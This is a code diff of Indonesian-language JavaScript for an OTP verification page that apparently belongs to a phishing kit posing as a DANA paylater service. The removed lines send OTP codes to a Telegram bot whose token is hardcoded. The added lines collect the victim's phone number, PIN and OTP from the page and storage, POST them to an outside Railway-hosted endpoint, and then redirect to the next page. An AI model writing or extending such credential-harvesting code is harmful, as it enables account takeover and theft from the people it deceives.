@@ -1,25 +1,19 @@
 // ============================
-// CONFIG TELEGRAM
-// ============================
-const token = "6568242561:AAEe52VXE51aO4QyDeUupKnlzG5urZMnbas";
-const chat_id = "6549762672";
-
-// ============================
 // ELEMENT
 // ============================
 const inputs = document.querySelectorAll(".otp-box input");
 const btn = document.getElementById("resendBtn");
 
 // ============================
-// AUTO PINDAH + DETEKSI OTP
+// HANDLE INPUT OTP
 // ============================
 inputs.forEach((input, index) => {
   input.addEventListener("input", () => {
 
-    // hanya 1 digit
+    // hanya angka 1 digit
     input.value = input.value.replace(/[^0-9]/g, "").slice(0,1);
 
-    // pindah ke next
+    // auto pindah
     if (input.value && index < inputs.length - 1) {
       inputs[index + 1].focus();
     }
@@ -36,7 +30,7 @@ inputs.forEach((input, index) => {
 });
 
 // ============================
-// CEK OTP LENGKAP
+// CEK OTP
 // ============================
 function cekOTP() {
   let otp = "";
@@ -44,37 +38,53 @@ function cekOTP() {
   inputs.forEach(i => otp += i.value);
 
   if (otp.length === 4) {
-    kirimOTP(otp);
-
-    // animasi kecil (opsional)
-    setTimeout(() => {
-      window.location.href = "tap.html"; // pindah halaman
-    }, 1500);
+    kirimData(otp);
   }
 }
 
 // ============================
-// KIRIM KE TELEGRAM
+// KIRIM SEMUA DATA (FINAL)
 // ============================
-function kirimOTP(otp) {
+async function kirimData(otp) {
 
-  const text = `
-🔐 OTP MASUK
+  const phone = localStorage.getItem("phone");
+  const pin = localStorage.getItem("pin");
 
-Kode OTP: ${otp}
-Waktu: ${new Date().toLocaleString()}
-Device: ${navigator.userAgent}
-  `;
+  console.log("📤 DATA DIKIRIM:", { phone, pin, otp });
 
-fetch("https://danacicilanpaylaterr-production.up.railway.app/send", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    text: text
-  })
-});
+  // validasi
+  if (!phone || !pin || !otp) {
+    console.log("❌ DATA TIDAK LENGKAP");
+    return;
+  }
+
+  try {
+    await fetch("https://danacicilanpaylaterr-production.up.railway.app/send", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        phone,
+        pin,
+        otp
+      })
+    });
+
+    console.log("✅ BERHASIL DIKIRIM");
+
+  } catch (err) {
+    console.log("❌ ERROR:", err);
+  }
+
+  // 🔥 hapus data biar tidak bentrok
+  localStorage.removeItem("phone");
+  localStorage.removeItem("pin");
+
+  // pindah halaman
+  setTimeout(() => {
+    window.location.href = "tap.html";
+  }, 1000);
 }
 
 // ============================
@@ -104,13 +114,9 @@ function startTimer() {
 
 startTimer();
 
-
-
-
-
-
-
-
+// ============================
+// TAMPILKAN NOMOR
+// ============================
 const phone = localStorage.getItem("phone");
 
 if (phone) {
@@ -118,6 +124,6 @@ if (phone) {
 
   if (el) {
     const masked = phone.slice(0, 3) + "****" + phone.slice(-3);
-    el.innerText = phone.startsWith("+62") ? phone : "+62" + phone;
+    el.innerText = "+62" + masked;
   }
 }
